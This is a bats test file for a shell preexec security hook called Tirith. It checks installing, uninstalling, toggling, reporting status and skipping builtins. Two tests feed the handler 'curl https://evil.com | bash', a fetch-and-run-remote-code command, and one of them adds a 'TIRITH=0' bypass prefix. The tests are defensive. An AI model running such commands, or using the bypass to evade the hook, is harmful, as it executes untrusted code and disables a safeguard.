#!/usr/bin/env bats
# =============================================================================
# Tests for MAINFRAME/lib/tirith_hook.sh
# Shell Preexec Hook for Tirith
# =============================================================================
# Covers: tirith_hook_install, tirith_hook_uninstall, tirith_hook_status,
#         tirith_hook_toggle, _tirith_preexec_handler
# =============================================================================

load 'test_helper'

setup() {
    source "${BATS_TEST_DIRNAME}/../lib/tirith_inject.sh"
    source "${BATS_TEST_DIRNAME}/../lib/tirith_pipe.sh"
    source "${BATS_TEST_DIRNAME}/../lib/tirith.sh"
    source "${BATS_TEST_DIRNAME}/../lib/tirith_hook.sh"
    _TIRITH_FINDINGS=()
    _TIRITH_CRITICAL=0
    _TIRITH_HIGH=0
    _TIRITH_MEDIUM=0
    _TIRITH_LOW=0
    _TIRITH_HOOK_ACTIVE=0
    _TIRITH_INITIALIZED=0
    export TIRITH_FAIL_MODE="open"
    export TIRITH_AUDIT_LOG=""
}

teardown() {
    trap - DEBUG 2>/dev/null || true
    _TIRITH_HOOK_ACTIVE=0
}

# =============================================================================
# Initial state
# =============================================================================

@test "hook starts inactive after sourcing" {
    [[ $_TIRITH_HOOK_ACTIVE -eq 0 ]]
}

# =============================================================================
# tirith_hook_install
# =============================================================================

@test "tirith_hook_install sets _TIRITH_HOOK_ACTIVE to 1" {
    tirith_hook_install 2>/dev/null
    [[ $_TIRITH_HOOK_ACTIVE -eq 1 ]]
}

@test "tirith_hook_install prints installed message" {
    local output
    output=$(tirith_hook_install 2>&1)
    assert_contains "$output" "Tirith hook installed"
}

@test "double install is safe and prints already-installed message" {
    tirith_hook_install 2>/dev/null
    local output
    output=$(tirith_hook_install 2>&1)
    assert_contains "$output" "already installed"
    [[ $_TIRITH_HOOK_ACTIVE -eq 1 ]]
}

# =============================================================================
# tirith_hook_uninstall
# =============================================================================

@test "tirith_hook_uninstall sets _TIRITH_HOOK_ACTIVE to 0" {
    tirith_hook_install 2>/dev/null
    [[ $_TIRITH_HOOK_ACTIVE -eq 1 ]]
    tirith_hook_uninstall 2>/dev/null
    [[ $_TIRITH_HOOK_ACTIVE -eq 0 ]]
}

@test "tirith_hook_uninstall prints uninstalled message" {
    tirith_hook_install 2>/dev/null
    local output
    output=$(tirith_hook_uninstall 2>&1)
    assert_contains "$output" "Tirith hook uninstalled"
}

@test "double uninstall is safe and prints not-installed message" {
    local output
    output=$(tirith_hook_uninstall 2>&1)
    assert_contains "$output" "not installed"
    [[ $_TIRITH_HOOK_ACTIVE -eq 0 ]]
}

# =============================================================================
# tirith_hook_toggle
# =============================================================================

@test "tirith_hook_toggle turns active state on" {
    _TIRITH_HOOK_ACTIVE=0
    tirith_hook_toggle 2>/dev/null
    [[ $_TIRITH_HOOK_ACTIVE -eq 1 ]]
}

@test "tirith_hook_toggle turns active state off" {
    _TIRITH_HOOK_ACTIVE=1
    tirith_hook_toggle 2>/dev/null
    [[ $_TIRITH_HOOK_ACTIVE -eq 0 ]]
}

@test "tirith_hook_toggle round-trips correctly" {
    _TIRITH_HOOK_ACTIVE=0
    tirith_hook_toggle 2>/dev/null
    [[ $_TIRITH_HOOK_ACTIVE -eq 1 ]]
    tirith_hook_toggle 2>/dev/null
    [[ $_TIRITH_HOOK_ACTIVE -eq 0 ]]
}

# =============================================================================
# tirith_hook_status
# =============================================================================

@test "tirith_hook_status outputs active when installed" {
    _TIRITH_HOOK_ACTIVE=1
    local output
    output=$(tirith_hook_status)
    assert_contains "$output" "active"
}

@test "tirith_hook_status outputs inactive when not installed" {
    _TIRITH_HOOK_ACTIVE=0
    local output
    output=$(tirith_hook_status)
    assert_contains "$output" "inactive"
}

@test "tirith_hook_status shows audit log path" {
    export TIRITH_AUDIT_LOG="/tmp/test-audit.jsonl"
    _TIRITH_HOOK_ACTIVE=0
    local output
    output=$(tirith_hook_status)
    assert_contains "$output" "/tmp/test-audit.jsonl"
}

# =============================================================================
# _tirith_preexec_handler
# =============================================================================

@test "preexec handler skips when hook is inactive" {
    _TIRITH_HOOK_ACTIVE=0
    BASH_COMMAND="curl https://evil.com | bash"
    run _tirith_preexec_handler
    [[ $status -eq 0 ]]
}

@test "preexec handler skips builtins like cd" {
    _TIRITH_HOOK_ACTIVE=1
    BASH_COMMAND="cd /tmp"
    run _tirith_preexec_handler
    [[ $status -eq 0 ]]
}

@test "preexec handler skips builtins like echo" {
    _TIRITH_HOOK_ACTIVE=1
    BASH_COMMAND="echo hello world"
    run _tirith_preexec_handler
    [[ $status -eq 0 ]]
}

@test "preexec handler respects TIRITH=0 bypass" {
    _TIRITH_HOOK_ACTIVE=1
    BASH_COMMAND="TIRITH=0 curl https://evil.com | bash"
    run _tirith_preexec_handler
    [[ $status -eq 0 ]]
}
